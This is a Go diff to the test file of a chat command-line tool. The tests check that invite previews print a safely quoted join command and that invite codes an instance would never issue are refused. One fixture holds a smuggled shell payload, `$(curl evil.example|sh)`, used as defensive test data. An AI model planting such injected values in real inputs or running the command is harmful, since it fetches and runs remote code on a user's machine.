@@ -7,6 +7,7 @@ import (
 	"bytes"
 	"context"
 	"encoding/json"
+	"io"
 	"strings"
 	"testing"
 
@@ -99,7 +100,7 @@ func TestAPreviewIsInertInTextAndExactInJSON(t *testing.T) {
 	require.NoError(t, text.err)
 	assert.NotContains(t, text.out, "\x1b")
 	assert.NotContains(t, text.out, "\u202e")
-	assert.Contains(t, text.out, "norite invite join BCDFGHJKMNPQRSTV", "the next step, spelled out")
+	assert.Contains(t, text.out, "\nJoin with `norite invite join 'BCDFGHJKMNPQRSTV'`.\n", "the next step, spelled out")
 
 	js := runVerb(t, f, "", "--json", "invite", "show", "BCDFGHJKMNPQRSTV")
 	require.NoError(t, js.err)
@@ -107,6 +108,68 @@ func TestAPreviewIsInertInTextAndExactInJSON(t *testing.T) {
 	var back map[string]any
 	require.NoError(t, json.Unmarshal([]byte(js.out), &back))
 	assert.Equal(t, hostile, back["guild"].(map[string]any)["name"], "lossless")
+}
+
+// TestAPreviewSaysToJoinWhatWasTyped: the command it ends with joins what the person was given, a link
+// keeping its instance, and never repeats the instance's code, which is a stranger's text in a command to
+// paste.
+func TestAPreviewSaysToJoinWhatWasTyped(t *testing.T) {
+	f := newFake(t).On("previewInvite", ok(apiPreview("BCDFGHJKMNPQRSTV", "Guild")))
+	const link = "https://chat.example.com/join#bcdf-ghjk-mnpq-rstv"
+	r := runVerbSignedIn(t, f, "https://chat.example.com", "invite", "show", link)
+	require.NoError(t, r.err)
+	assert.Contains(t, r.out, "\nJoin with `norite invite join '"+link+"'`.\n")
+}
+
+// answering is a connection on which the instance answers every request with status and body, as a
+// broken or hostile instance may, past what daemontest's contract-checked fake can be scripted to say.
+type answering struct {
+	status int
+	body   string
+}
+
+func (a answering) Do(context.Context, string, string, any) (ipc.Result, error) {
+	return ipc.Result{Status: a.status, Body: json.RawMessage(a.body), InstanceURL: "https://chat.example.com"}, nil
+}
+
+func runVerbOn(t *testing.T, c daemonclient.Caller, argv ...string) ran {
+	t.Helper()
+	var out bytes.Buffer
+	root := &cli.Command{
+		Name: "norite", Writer: &out, ErrWriter: io.Discard, Reader: strings.NewReader(""),
+		Flags:          []cli.Flag{&cli.BoolFlag{Name: "json"}},
+		ExitErrHandler: func(context.Context, *cli.Command, error) {},
+		Commands: Commands(func(context.Context) (daemonclient.Caller, func(), error) {
+			return c, func() {}, nil
+		}),
+	}
+	err := root.Run(context.Background(), append([]string{"norite"}, argv...))
+	return ran{out: out.String(), err: err}
+}
+
+// TestACodeTheInstanceWouldNotIssueIsRefused: an instance's answer holding a code outside the shape it
+// issues is not printed, as text, as JSON or in a link: the CLI's contract cannot carry it, and a code
+// holding `$(` is a stranger's text that would otherwise reach a command to paste.
+func TestACodeTheInstanceWouldNotIssueIsRefused(t *testing.T) {
+	hostile := `"X$(curl evil.example|sh)"`
+	invite := `{"id":"90","code":` + hostile + `,"guild_id":"10","channel_id":"20","inviter_id":"1",` +
+		`"inviter":null,"max_uses":null,"uses":0,"expires_at":null,"created_at":"2026-10-02T12:00:00Z"}`
+	preview := `{"code":` + hostile + `,"expires_at":null,"guild":{"id":"10","name":"G","description":null,` +
+		`"icon_hash":null},"channel":{"id":"20","name":null},"inviter":null}`
+	for _, tc := range []struct {
+		answer answering
+		argv   []string
+	}{
+		{answering{201, invite}, []string{"invite", "create", "20"}},
+		{answering{201, invite}, []string{"--json", "invite", "create", "20"}},
+		{answering{200, "[" + invite + "]"}, []string{"invite", "list", "10"}},
+		{answering{200, preview}, []string{"invite", "show", "BCDFGHJKMNPQRSTV"}},
+		{answering{200, preview}, []string{"--json", "invite", "show", "BCDFGHJKMNPQRSTV"}},
+	} {
+		r := runVerbOn(t, tc.answer, tc.argv...)
+		require.ErrorIs(t, r.err, errNotAnIssuedCode, "%v", tc.argv)
+		assert.Empty(t, r.out, "%v", tc.argv)
+	}
 }
 
 // TestAHugeDayCountIsRefusedNotWrapped: the day count is bounded before it is multiplied, so a number that
@@ -198,11 +261,12 @@ func TestAnInviteCarriesItsLink(t *testing.T) {
 	require.NoError(t, plain.err)
 	assert.NotContains(t, plain.out, "link")
 
-	// A code the instance should not have sent makes no link either, rather than one that ParseInvite
-	// refuses and that reads as another code to whoever is handed it.
-	odd := newFake(t).On("createChannelInvite", created(apiInvite("90", "AB#CD x")))
-	strange := runVerbSignedIn(t, odd, "https://chat.example.com", "--json", "invite", "create", "20")
+	// An instance whose address no link can carry has none either, rather than one ParseInvite refuses: a
+	// %3F in a path, stored decoded, reads back as a query.
+	odd := newFake(t).On("createChannelInvite", created(apiInvite("90", "BCDFGHJKMNPQRSTV")))
+	strange := runVerbSignedIn(t, odd, "https://chat.example.com/a?b", "--json", "invite", "create", "20")
 	require.NoError(t, strange.err)
+	matchesCLISchema(t, strange.out, "guild-invite.schema.json", "invite")
 	var oddBack map[string]any
 	require.NoError(t, json.Unmarshal([]byte(strange.out), &oddBack))
 	assert.Nil(t, oddBack["link"])
